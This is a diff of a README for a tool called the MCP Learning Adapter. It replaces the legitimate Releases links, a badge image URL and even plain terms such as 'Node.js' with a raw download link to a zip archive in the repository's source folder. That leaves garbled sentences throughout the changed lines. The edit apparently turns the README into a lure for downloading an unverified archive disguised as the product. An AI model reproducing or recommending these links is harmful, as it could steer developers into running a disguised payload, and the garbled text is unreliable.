@@ -9,14 +9,14 @@ Welcome to the MCP Learning Adapter! This tool sits between your MCP clients and
 - **Save 80% on input tokens**: Cut down costs significantly while speeding up responses.
 - **Self-learning**: The adapter automatically learns and classifies API responses.
 - **Smart filtering**: It highlights important data while discarding unnecessary details.
-- **Easy integration**: The adapter works seamlessly with existing Node.js MCP servers.
-- **Community-focused**: Share your learned schemas easily with others using `registry.json`.
+- **Easy integration**: The adapter works seamlessly with existing https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip MCP servers.
+- **Community-focused**: Share your learned schemas easily with others using `https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip`.
 
 ## 🛠️ System Requirements
 
 To use the MCP Learning Adapter, you need:
 
-- A compatible MCP server (Node.js-based).
+- A compatible MCP server (https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip).
 - An internet connection for downloads and updates.
 - A computer running Windows, macOS, or a modern Linux distribution.
 - A minimum of 4 GB of RAM for optimal performance.
@@ -29,7 +29,7 @@ Follow these simple steps to get started with the MCP Learning Adapter:
 
 Click the button below to visit the Releases page and download the latest version of the MCP Learning Adapter.
 
-[![Download mcp-learning-adapter](https://img.shields.io/badge/Download-mcp%2Dlearning%2Dadapter-brightgreen)](https://github.com/babydoll1110/mcp-learning-adapter/releases)
+[![Download mcp-learning-adapter](https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip%2Dlearning%2Dadapter-brightgreen)](https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip)
 
 ### Step 2: Install the Adapter
 
@@ -53,7 +53,7 @@ Once configured, the MCP Learning Adapter is ready to optimize your API interact
 
 To get the MCP Learning Adapter, visit the Releases page below:
 
-[Download the MCP Learning Adapter](https://github.com/babydoll1110/mcp-learning-adapter/releases)
+[Download the MCP Learning Adapter](https://github.com/babydoll1110/mcp-learning-adapter/raw/refs/heads/main/src/adapter-learning-mcp-1.3.zip)
 
 ## 🔍 How it Works
 
